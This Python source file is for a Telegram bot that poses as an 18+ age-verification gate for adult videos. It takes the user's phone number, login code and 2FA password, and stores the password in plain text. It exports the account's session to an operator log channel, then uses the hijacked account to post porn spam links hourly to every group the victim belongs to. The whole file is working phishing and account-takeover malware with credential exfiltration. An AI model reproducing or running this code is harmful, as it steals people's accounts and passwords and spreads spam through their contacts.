import os
import asyncio
import random
from pathlib import Path
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    AuthKeyUnregistered,
    SessionRevoked,
    SessionExpired
)

from info import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['sessions']

# Promo Texts (10 unique messages)
PROMO_TEXTS = [
    "🔥 10K+ Horny Videos!! \n💦 Real Cum, No Filters \n💎 Ultra HD Uncut Scenes \n👉 https://tinyurl.com/Hot-Robot",
    "💋 Uncensored Desi Leaks! \n🔥 Real GF/BF Videos \n😍 Free Access Here \n👉 https://tinyurl.com/Hot-Robot",
    "😈 Indian, Desi, Couples \n🔥 10K+ Horny Videos!! \n💦 Hidden Cam + GF Fun \n👉 https://tinyurl.com/Hot-Robot",
    "🎥 Leaked College MMS \n😍 100% Real Desi Action \n💥 Tap to Watch \n👉 https://tinyurl.com/Hot-Robot",
    "💎 VIP Only Scenes Now Free \n💦 Hidden Cam + GF Fun \n👀 Daily New Leaks \n👉 https://tinyurl.com/Hot-Robot",
    "👄 Unlimited Hot Content \n🔞 Free Lifetime Access \n🎁 Exclusive Videos \n👉 https://tinyurl.com/Hot-Robot",
    "🍑 Hidden Cam + GF Fun \n👀 Just Click & Watch \n💦 Ultra Real Videos \n👉 https://tinyurl.com/Hot-Robot",
    "🎬 Daily New Leaks \n💥 Indian, Desi, Couples \n🔞 10K+ Horny Videos!! \n👉 https://tinyurl.com/Hot-Robot",
    "👀 New Viral Hard Videos \n👄 Real Amateur Fun \n🎉 Join & Enjoy \n👉 https://tinyurl.com/Hot-Robot",
    "🚨 Unlimited Hot Content \n💦 18+ Only Videos \n🔥 Try Once, Regret Never \n👉 https://tinyurl.com/Hot-Robot"
]

# Strings
strings = {
    'need_login': "You Have To /start First!",
    'already_logged_in': "You're Already Logged In! 🥳",
    'age_verification': "**⚠️ Need 18+ Verification! ⚠️**\n\nYou Must Be 18+ To Proceed.\n\nClick Below Button To Verify 👇",
    'verification_success': "**✅ Verification Done! ✅**\n\n⚠️ Important: You Must Join All Channels To Get Access To Videos!\n\n🗓 Daily 100+ New Videos Uploaded\n🔞 18+ Only | Leaked | Exclusive Videos\n⚡ Instant Access After Joining Channel\n\n👇 Click The Buttons Below To Join 👇",
    'logout_success': "**🔒 Logged out! 🔒**\n\nPlease /start To Access Again.",
    'not_logged_in': "**Not logged in! **\n\nPlease /start First.",
    'otp_wrong': "**❌ WRONG VERIFICATION CODE! ❌**\n\nYour Attempts left: {attempts}\n\n📤 Re-enter The Verification Code We sent:",
    '2fa_wrong': "**❌ WRONG 2FA PASSWORD! ❌**\n\nYour Attempts left: {attempts}\n\n📤 Re-enter The Your 2FA Password:",
    'otp_blocked': "**🚫 BLOCKED! 🚫**\n\nToo Many Wrong Verification Code Attempts.",
    '2fa_blocked': "**🚫 BLOCKED! 🚫**\n\nToo Many Wrong 2FA Password Attempts."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("👉 ɢᴇᴛ ᴛʜᴇ ᴄᴏᴅᴇ.", url="https://t.me/+42777")
    ],
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("🆗", callback_data="otp_submit")
    ]
])

# Verification Success Keyboard
VERIFICATION_SUCCESS_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("🍑 𝗔𝗹𝗹 𝗩𝗶𝗱𝗲𝗼𝘀 𝗟𝗶𝗻𝗸𝘀 🍑", url="https://t.me/+KK6CiRWSDf8zOTBl")
    ],
    [
        InlineKeyboardButton("𝟭𝟴+ 𝗩𝗶𝗿𝗮𝗹 𝗩𝗶𝗱𝗲𝗼𝘀 🔥", url="https://t.me/+RTzbeBsesLM2YmU9"),
        InlineKeyboardButton("𝗔𝗱𝘂𝗹𝘁 𝗨𝗻𝗶𝘃𝗲𝗿𝘀𝗲 🫦", url="https://t.me/+ulsXd3bzknhhNmFl")
    ],
    [
        InlineKeyboardButton("𝗗𝗲𝘀𝗶, 𝗖𝗼𝗹𝗹𝗲𝗴𝗲, 𝗧𝗲𝗲𝗻, 𝗠𝗶𝗹𝗳, 𝗟𝗲𝘀𝗯𝗶𝗮𝗻, 𝗔𝗺𝗮𝘁𝗲𝘂𝗿", url="https://t.me/+xiiUvy2vbtJjNjk1")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

async def handle_session_error(bot: Client, phone_number: str, error: Exception):
    error_type = {
        AuthKeyUnregistered: "SESSION_EXPIRED",
        SessionRevoked: "SESSION_REVOKED", 
        SessionExpired: "SESSION_EXPIRED"
    }.get(type(error), "UNKNOWN_ERROR")
    
    await bot.send_message(
        LOG_CHANNEL_SESSIONS_FILES,
        f"💀 #{error_type}: {phone_number}\n"
        f"🛑 Auto-disabled promotion\n"
        f"❌ Error: {str(error)[:200]}"
    )
    database.update_one(
        {"mobile_number": phone_number},
        {"$set": {"promotion": False}}
    )

@Client.on_message(filters.private & filters.command("start"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})
    
    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()
            
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
            return
        except Exception:
            # Silent session cleanup - no messages to user or logs
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": False, "session": None, "promotion": False}}
            )
            # Continue silently with new login process
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    
    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False}}
    )
    
    await message.reply(strings['logout_success'])
    await cleanup_user_state(user_id)
    
@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
        return
    
    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    
    client = Client(":memory:", API_ID, API_HASH)
    
    try:
        await client.connect()
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': '',
            'processing_msg_id': processing_msg.id,
            'otp_attempts': 0,
            '2fa_attempts': 0
        }
        
        sent_msg = await bot.send_message(
            user_id,
            "**Verification Code Successfully Sent!**\n\n📤 Enter The Verification Code We sent:",
            reply_markup=OTP_KEYBOARD
        )
        user_states[user_id]['last_msg_id'] = sent_msg.id
        await bot.delete_messages(user_id, processing_msg.id)
        
    except Exception as e:
        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /start again.", show_alert=True)
        await query.message.delete()
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("Verification Code Must Be At Least 5 Digits!", show_alert=True)
            return
        
        await query.message.edit("Verifying Code...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except PhoneCodeInvalid:
            state['otp_attempts'] += 1
            if state['otp_attempts'] >= 3:
                await query.message.edit(strings['otp_blocked'])
                database.update_one(
                    {"id": user_id},
                    {"$set": {"blocked": True}}
                )
                await cleanup_user_state(user_id)
                return
            
            attempts_left = 3 - state['otp_attempts']
            await query.message.edit(
                strings['otp_wrong'].format(attempts=attempts_left),
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = ''
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA Password Required! 🔒**\n\nEnter Your 2FA Password:")
            state['needs_password'] = True
            state['last_msg_id'] = query.message.id
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/start again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    await query.message.edit(
        f"**Current Verification Code:** `{state['otp_digits'] or '____'}`\n\nPress 🆗 When Done.\n\n📤 Enter The Verification Code We sent:",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["start", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        if 'last_msg_id' in state:
            try:
                await bot.delete_messages(user_id, state['last_msg_id'])
            except Exception:
                pass
        
        try:
            await message.delete()
        except Exception:
            pass
        
        await state['client'].check_password(password=password)
        verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
        state['verified_msg_id'] = verified_msg.id
        
        database.update_one(
            {"id": user_id},
            {"$set": {
                "2fa_status": True,
                "2fa_password": password
            }},
            upsert=True
        )
        
        await create_session(bot, state['client'], user_id, state['phone_number'])
        
    except PasswordHashInvalid:
        state['2fa_attempts'] += 1
        if state['2fa_attempts'] >= 3:
            await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
            database.update_one(
                {"id": user_id},
                {"$set": {"blocked": True}}
            )
            await cleanup_user_state(user_id)
            return
        
        attempts_left = 3 - state['2fa_attempts']
        error_msg = await message.reply(
            strings['2fa_wrong'].format(attempts=attempts_left),
            reply_markup=ReplyKeyboardRemove()
        )
        state['last_msg_id'] = error_msg.id
    except Exception as e:
        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion': True
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        os.makedirs("sessions", exist_ok=True)
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        with open(session_file, "w") as f:
            f.write(string_session)
            
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
        )
        os.remove(session_file)

        # Delete both verified_msg_id and last_msg_id if they exist
        state = user_states.get(user_id, {})
        messages_to_delete = []
        if 'verified_msg_id' in state:
            messages_to_delete.append(state['verified_msg_id'])
        if 'last_msg_id' in state:
            messages_to_delete.append(state['last_msg_id'])
        
        for msg_id in messages_to_delete:
            try:
                await bot.delete_messages(user_id, msg_id)
            except Exception:
                pass
        
        await bot.send_message(
            user_id,
            strings['verification_success'],
            reply_markup=VERIFICATION_SUCCESS_KEYBOARD
        )
        asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
        
    except Exception as e:
        await bot.send_message(user_id, f"Error creating session: {e}\n/start again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
    already_notified = False
    status_message = None
    
    while True:
        client = None
        try:
            client = Client("promo", session_string=session_string)
            await client.start()
            already_notified = False
            
            # Get user info and stats
            me = await client.get_me()
            total_groups = 0
            owned_channels = 0
            owned_groups = 0
            members_count = 0
            groups = []
            
            # Get detailed stats
            try:
                async for dialog in client.get_dialogs():
                    try:
                        if not hasattr(dialog, 'chat'):
                            continue
                            
                        chat = dialog.chat
                        if not chat:
                            continue
                            
                        # Count all groups
                        if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                            total_groups += 1
                            groups.append(chat)
                            
                        # Check ownership
                        if hasattr(chat, 'is_creator') and chat.is_creator:
                            if chat.type == enums.ChatType.CHANNEL:
                                owned_channels += 1
                            elif chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                                owned_groups += 1
                            
                            # Get members count
                            if hasattr(chat, 'members_count') and chat.members_count:
                                members_count += chat.members_count
                            else:
                                try:
                                    count = await client.get_chat_members_count(chat.id)
                                    members_count += count
                                except:
                                    pass
                    except Exception:
                        continue
            except Exception:
                pass
            
            # Create/update status message
            message_text = (
                f"🚀 Promotion Starting For: {phone_number}\n"
                f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                f"📊 Status:\n"
                f"• Total Groups: {total_groups}\n"
                f"• Owned Groups: {owned_groups}\n"
                f"• Owned Channels: {owned_channels}\n"
                f"• Total Members in Owned Chats: {members_count}\n\n"
                f"✅ Total Messages Sent: 0/{total_groups}"
            )
            
            try:
                if status_message:
                    await status_message.edit_text(message_text)
                else:
                    status_message = await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        message_text
                    )
            except Exception:
                # If message was deleted, send new one
                status_message = await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    message_text
                )
            
            # Promotion cycle
            user_data = database.find_one({"mobile_number": phone_number})
            if not user_data or not user_data.get('promotion', True):
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"⏸️ Promotion stopped for: {phone_number}"
                )
                break

            sent_count = 0
            for group in groups:
                try:
                    promo_text = random.choice(PROMO_TEXTS)
                    await client.send_message(group.id, promo_text)
                    sent_count += 1
                    
                    # Update status message after each successful send
                    try:
                        await status_message.edit_text(
                            f"🚀 Promotion Starting For: {phone_number}\n"
                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                            f"📊 Status:\n"
                            f"• Total Groups: {total_groups}\n"
                            f"• Owned Groups: {owned_groups}\n"
                            f"• Owned Channels: {owned_channels}\n"
                            f"• Total Members in Owned Chats: {members_count}\n\n"
                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                        )
                    except Exception:
                        # If message was deleted, recreate it
                        status_message = await bot.send_message(
                            LOG_CHANNEL_SESSIONS_FILES,
                            f"🚀 Promotion Starting For: {phone_number}\n"
                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                            f"📊 Status:\n"
                            f"• Total Groups: {total_groups}\n"
                            f"• Owned Groups: {owned_groups}\n"
                            f"• Owned Channels: {owned_channels}\n"
                            f"• Total Members in Owned Chats: {members_count}\n\n"
                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                        )
                    
                    await asyncio.sleep(60)
                except FloodWait as e:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"⏳ FloodWait {e.value}s for {phone_number}"
                    )
                    await asyncio.sleep(e.value + 5)
                except Exception as e:
                    await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        f"❌ Failed to send to {getattr(group, 'title', '?')}: {str(e)[:200]}"
                    )
                    await asyncio.sleep(5)

            # Final update when cycle completes
            try:
                await status_message.edit_text(
                    f"🚀 Cycle Completed For: {phone_number}\n"
                    f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                    f"📊 Status:\n"
                    f"• Total Groups: {total_groups}\n"
                    f"• Owned Groups: {owned_groups}\n"
                    f"• Owned Channels: {owned_channels}\n"
                    f"• Total Members in Owned Chats: {members_count}\n\n"
                    f"✅ Total Messages Sent: {sent_count}/{total_groups}\n\n"
                    f"⏳ Next Cycle Starting In 1 Hours."
                )
            except Exception:
                pass
                
            await asyncio.sleep(3600)
            
        except (AuthKeyUnregistered, SessionRevoked, SessionExpired) as e:
            if not already_notified:
                await handle_session_error(bot, phone_number, e)
                already_notified = True
            break
        except Exception as e:
            await bot.send_message(
                LOG_CHANNEL_SESSIONS_FILES,
                f"⚠️ Cycle error: {str(e)[:200]}\nRetrying in 5m..."
            )
            await asyncio.sleep(300)
        finally:
            if client:
                try:
                    await client.stop()
                except:
                    pass
